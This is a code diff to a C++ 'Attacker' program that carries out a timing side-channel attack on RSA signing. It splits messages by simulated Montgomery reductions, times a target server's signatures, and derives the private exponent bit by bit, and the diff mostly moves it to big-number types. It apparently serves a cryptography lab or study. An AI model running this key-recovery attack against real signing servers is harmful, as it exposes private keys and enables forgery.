@@ -9,10 +9,10 @@ int main(int argc, char *argv[]){
     }
 
     Attacker a = Attacker(argv[1], atoi(argv[2]));
-    a.public_e = atoi(argv[3]);
-    a.public_n = atoi(argv[4]);
-    a.messages_per_bit = atoi(argv[5]);
-    a.derived_exponent = atoi(argv[6]);
+    a.public_e = argv[3];
+    a.public_n = argv[4];
+    a.messages_per_bit = argv[5];
+    a.derived_exponent = argv[6];
     printf("Attacking server %s:%s. Using public exponent %s and modulus %s\n", argv[1], argv[2], argv[3], argv[4]);
     printf("So far, we have derived the exponent up to %d\n", atoi(argv[6]));
     a.perform_attack();
@@ -27,7 +27,8 @@ void Attacker::perform_attack(){
         attack_next_bit();
     }
     else {
-        printf("We found the key! It's %d!\n", derived_exponent);
+        std::cout << "We found the key! It's: " << derived_exponent << std::endl;
+//        printf("We found the key! It's %d!\n", derived_exponent);
     }
 }
 
@@ -60,8 +61,10 @@ TimedResponse Attacker::sign_message(const std::string &message){
     return result;
 }
 
-TimedResponse Attacker::sign_message(const int message){
-    return sign_message(std::to_string(message));
+TimedResponse Attacker::sign_message(const num &message){
+    std::stringstream StrStream;
+    StrStream << message;
+    return sign_message(StrStream.str());
 }
 
 /*
@@ -91,7 +94,6 @@ bool Attacker::ModExpBoolean(const num &M, const num &d, const num &n){
     }
     return step4;
 }
-
 
 num Attacker::MontgomeryProduct(const num &a, const num &b, const num &nprime, const num &r, const num &n, bool &step4){
     num t = a * b;
@@ -134,17 +136,17 @@ TimedResponse sign_message2(const std::string &message){
 */
 void Attacker::attack_next_bit() {
     //The two sets
-    std::vector<int> set_true;
-    std::vector<int> set_false;
+    std::vector<num> set_true;
+    std::vector<num> set_false;
     std::vector<TimedResponse> trueResponses;
     std::vector<TimedResponse> falseResponses;
 
     //Simulate messages
-    int guess = (derived_exponent << 1) + 1; // Guess that the next bit is 1.
-    printf("current guess: %d\n", guess);
-    printf("simulating exponentiation of %d messages - dividing messages into two sets.\n", messages_per_bit);
-    for( int i = 0; i < messages_per_bit; i++ ) {
-        int random_message = (rand() % public_n) ;
+    num guess = (derived_exponent << 1) + 1; // Guess that the next bit is 1.
+    std::cout << "current guess: " << guess << std::endl;
+    std::cout << "simulating exponentiation of " << messages_per_bit << "messages - dividing messages into two sets." << std::endl;
+    for( num i = 0; i < messages_per_bit; i++ ) {
+        num random_message(rand()) ;
         bool v = ModExpBoolean(random_message, guess, public_n);
         if(v){
             set_true.push_back(random_message);
@@ -159,13 +161,13 @@ void Attacker::attack_next_bit() {
     */
     std::cout<<"Requsting signatures from server...\n";
     long long tTrue = 0,tFalse = 0;
-    for(int message: set_true){
+    for(num message: set_true){
         TimedResponse t = sign_message(message);
         tTrue += t.duration.count();
         trueResponses.push_back(t);
     }
 
-    for( int message: set_false){
+    for( num message: set_false){
         TimedResponse t = sign_message(message);
         tFalse+=t.duration.count();
         falseResponses.push_back(t);
